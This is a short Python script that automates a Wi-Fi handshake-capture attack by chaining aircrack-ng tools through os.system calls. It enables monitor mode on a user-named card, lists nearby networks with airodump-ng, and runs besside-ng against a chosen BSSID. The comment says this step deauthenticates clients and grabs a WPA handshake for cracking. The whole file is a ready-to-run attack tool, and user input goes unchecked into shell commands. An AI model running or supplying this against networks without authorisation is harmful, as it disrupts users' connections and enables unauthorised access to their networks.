#imports module to run terminal commands
import os


#starts airmon-ng with sudous privileges
os.system("sudo airmon-ng")


#waits for input of the card name you want to use to grab the handshake
card = input("Enter card name: ")


#starts wireless card in monitor mode
command = "sudo airmon-ng start " + card

os.system(str(command))


#starts airodump-ng so you can find the network bssid
command = "sudo airodump-ng " + card + "mon"

os.system(command)


#input the ssid
bssid = input("Enter bssid: ")


#deaths a client and grabs a handshake
command = "sudo besside-ng -b " + bssid + " " + card + "mon"

os.system(command)
